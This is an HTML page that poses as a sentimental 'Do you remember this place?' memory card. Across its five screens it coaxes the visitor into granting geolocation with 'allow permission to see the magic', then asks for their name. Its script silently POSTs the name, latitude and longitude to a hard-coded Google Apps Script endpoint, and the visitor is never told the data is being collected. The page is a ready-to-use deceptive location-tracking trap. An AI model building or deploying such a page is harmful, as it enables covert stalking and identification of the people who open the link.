<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Memory ❤️</title>

<style>

* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}

body {
    min-height: 100vh;
    background: #080808;
    color: white;
    font-family: Arial, sans-serif;
    overflow: hidden;
}

.container {
    width: 100%;
    max-width: 500px;
    min-height: 100vh;
    padding: 25px;
    margin: auto;

    display: flex;
    justify-content: center;
    align-items: center;
}

.screen {
    width: 100%;
    display: none;
    text-align: center;
    animation: fadeIn 0.7s ease;
}

.screen.active {
    display: block;
}

/* PHOTO */

.memory-photo {
    width: 100%;
    height: 55vh;

    object-fit: cover;

    border-radius: 24px;

    box-shadow:
        0 20px 60px rgba(0,0,0,0.7);

    animation: photoIn 1s ease;
}

/* TEXT */

h1 {
    font-size: 28px;
    margin-top: 25px;
    margin-bottom: 12px;
}

p {
    color: #aaa;
    line-height: 1.6;
    margin-bottom: 25px;
}

/* BUTTON */

button {
    display: block;

    width: 100%;
    max-width: 330px;

    margin: 9px auto;

    padding: 17px;

    border: none;
    border-radius: 50px;

    background: white;
    color: black;

    font-size: 16px;
    font-weight: bold;

    cursor: pointer;
}

button:active {
    transform: scale(0.96);
}

button:disabled {
    opacity: 0.5;
}

.secondary {
    background: #222;
    color: white;
}

/* ICON */

.big-icon {
    font-size: 70px;
    margin-bottom: 15px;
}

.location-icon {
    animation: pulse 1.5s infinite;
}

/* INPUT */

.name-input {
    width: 100%;
    max-width: 330px;

    display: block;

    margin: 0 auto 15px;

    padding: 17px;

    border-radius: 15px;

    border: 1px solid #444;

    background: #171717;

    color: white;

    font-size: 17px;

    outline: none;
}

.name-input:focus {
    border-color: white;
}

/* LOADER */

.loader {
    width: 60px;
    height: 60px;

    margin: 0 auto 25px;

    border-radius: 50%;

    border: 4px solid #333;

    border-top-color: white;

    animation: spin 1s linear infinite;
}

/* ANIMATIONS */

@keyframes fadeIn {

    from {
        opacity: 0;
        transform: translateY(25px);
    }

    to {
        opacity: 1;
        transform: translateY(0);
    }
}

@keyframes photoIn {

    from {
        opacity: 0;
        transform: scale(0.85);
    }

    to {
        opacity: 1;
        transform: scale(1);
    }
}

@keyframes pulse {

    0% {
        transform: scale(1);
    }

    50% {
        transform: scale(1.15);
    }

    100% {
        transform: scale(1);
    }
}

@keyframes spin {

    to {
        transform: rotate(360deg);
    }
}

</style>
</head>


<body>

<div class="container">


<!-- =====================================
     SCREEN 1 — MEMORY
===================================== -->

<div
    id="memoryScreen"
    class="screen active">

    <!--
        Put your photo in the same folder
        and name it memory.jpg
    -->

    <img
        class="memory-photo"
        src="https://i.ibb.co/PsfsJzf4/Screenshot-2026-0727-214514.png"
        alt="Memory">

    <h1>
        Do you remember this place? ❤️
    </h1>

    <p>
        Some memories never disappear.
    </p>

    <button onclick="showLocationScreen()">
        Yes, I remember
    </button>

</div>


<!-- =====================================
     SCREEN 2 — LOCATION
===================================== -->

<div
    id="locationScreen"
    class="screen">

    <div class="big-icon location-icon">
        ❤️
    </div>

    <h1>
        allow permission to see the magic 🪄 
    </h1>

    <p>
        something is waiting for you🫵🏻.
    </p>

    <button
        id="locationButton"
        onclick="getLocation()">

        next

    </button>

    <button
        class="secondary"
        onclick="showScreen('memoryScreen')">

        Go back

    </button>

    <p id="locationStatus"></p>

</div>


<!-- =====================================
     SCREEN 3 — NAME
===================================== -->

<div
    id="nameScreen"
    class="screen">

    <div class="big-icon">
        😊
    </div>

    <h1>
        Almost done
    </h1>

    <p>
        What's your name?
    </p>

    <input
        id="nameInput"
        class="name-input"
        type="text"
        maxlength="50"
        placeholder="Enter your name"
        autocomplete="name">

    <button onclick="saveData()">
        Continue
    </button>

</div>


<!-- =====================================
     SCREEN 4 — SAVING
===================================== -->

<div
    id="savingScreen"
    class="screen">

    <div class="loader"></div>

    <h1>
        loading...
    </h1>

    <p>
        Just a moment ❤️
    </p>

</div>


<!-- =====================================
     SCREEN 5 — SUCCESS
===================================== -->

<div
    id="successScreen"
    class="screen">

    <div class="big-icon">
        ❤️
    </div>

    <h1>
        thanks for wait!
    </h1>

    <p>
        Thank you for remembering this place.
    </p>

</div>


</div>


<script>

/* =========================================
   GOOGLE APPS SCRIPT URL
=========================================

   Replace this with your Apps Script
   Web App URL ending with /exec.

========================================= */

const GOOGLE_SCRIPT_URL =
    "https://script.google.com/macros/s/AKfycbyqA2sSC5K0Lajia_4_qlf34VPNYVMuKKOFZDpE-sWTTR-Yze4OCFkktfTJJUcSkPvX/exec";


/* =========================================
   LOCATION VARIABLE
========================================= */

let userLocation = null;


/* =========================================
   CHANGE SCREEN
========================================= */

function showScreen(id) {

    document
        .querySelectorAll(".screen")
        .forEach(function(screen) {

            screen.classList.remove("active");

        });

    document
        .getElementById(id)
        .classList.add("active");
}


/* =========================================
   MEMORY → LOCATION SCREEN
========================================= */

function showLocationScreen() {

    showScreen("locationScreen");

}


/* =========================================
   GET LOCATION
========================================= */

function getLocation() {

    if (!navigator.geolocation) {

        alert(
            "Location is not supported by this browser."
        );

        return;
    }


    const button =
        document.getElementById(
            "locationButton"
        );

    const status =
        document.getElementById(
            "locationStatus"
        );


    button.disabled = true;

    button.innerText =
        "Finding location...";

    status.innerText =
        "Please wait...";


    navigator.geolocation.getCurrentPosition(

        /* SUCCESS */

        function(position) {

            userLocation = {

                latitude:
                    position.coords.latitude,

                longitude:
                    position.coords.longitude

            };


            console.log(
                "Latitude:",
                userLocation.latitude
            );

            console.log(
                "Longitude:",
                userLocation.longitude
            );


            button.disabled = false;

            button.innerText =
                "Share my location";


            status.innerText =
                "Location found ✓";


            /*
                Location obtained.

                Now ask for name.
            */

            setTimeout(function() {

                showScreen("nameScreen");

            }, 500);

        },


        /* ERROR */

        function(error) {

            console.log(
                "Location error:",
                error
            );


            button.disabled = false;

            button.innerText =
                "Try again";


            status.innerText = "";


            if (error.code === 1) {

                alert(
                    "Location permission was denied.\n\n" +
                    "Please allow location access for this website."
                );

            }

            else if (error.code === 2) {

                alert(
                    "Your phone could not determine your location.\n\n" +
                    "Make sure Location/GPS is ON and try again."
                );

            }

            else if (error.code === 3) {

                alert(
                    "Finding your location took too long.\n\n" +
                    "Please try again in an open area or near a window."
                );

            }

            else {

                alert(
                    "Unable to get your location."
                );

            }

        },


        /* OPTIONS */

        {
            enableHighAccuracy: false,

            timeout: 120000,

            maximumAge: 60000
        }

    );

}


/* =========================================
   SAVE NAME + LOCATION
========================================= */

async function saveData() {

    const nameInput =
        document.getElementById(
            "nameInput"
        );


    const name =
        nameInput.value.trim();


    /* Check name */

    if (name === "") {

        alert(
            "Please enter your name."
        );

        nameInput.focus();

        return;
    }


    /* Check location */

    if (!userLocation) {

        alert(
            "Location was not obtained."
        );

        showScreen("locationScreen");

        return;
    }


    /* Show saving screen */

    showScreen("savingScreen");


    /*
        Only these values are sent:
        
        Name
        Latitude
        Longitude
    */

    const data = {

        name:
            name,

        latitude:
            userLocation.latitude,

        longitude:
            userLocation.longitude

    };


    try {

        await fetch(

            GOOGLE_SCRIPT_URL,

            {
                method: "POST",

                mode: "no-cors",

                headers: {
                    "Content-Type":
                        "text/plain;charset=utf-8"
                },

                body:
                    JSON.stringify(data)
            }

        );


        /*
            Show success.
        */

        showScreen("successScreen");


    }

    catch (error) {

        console.error(
            error
        );

        alert(
            "Could not save the information."
        );

        showScreen("nameScreen");

    }

}

</script>

</body>
    </html>
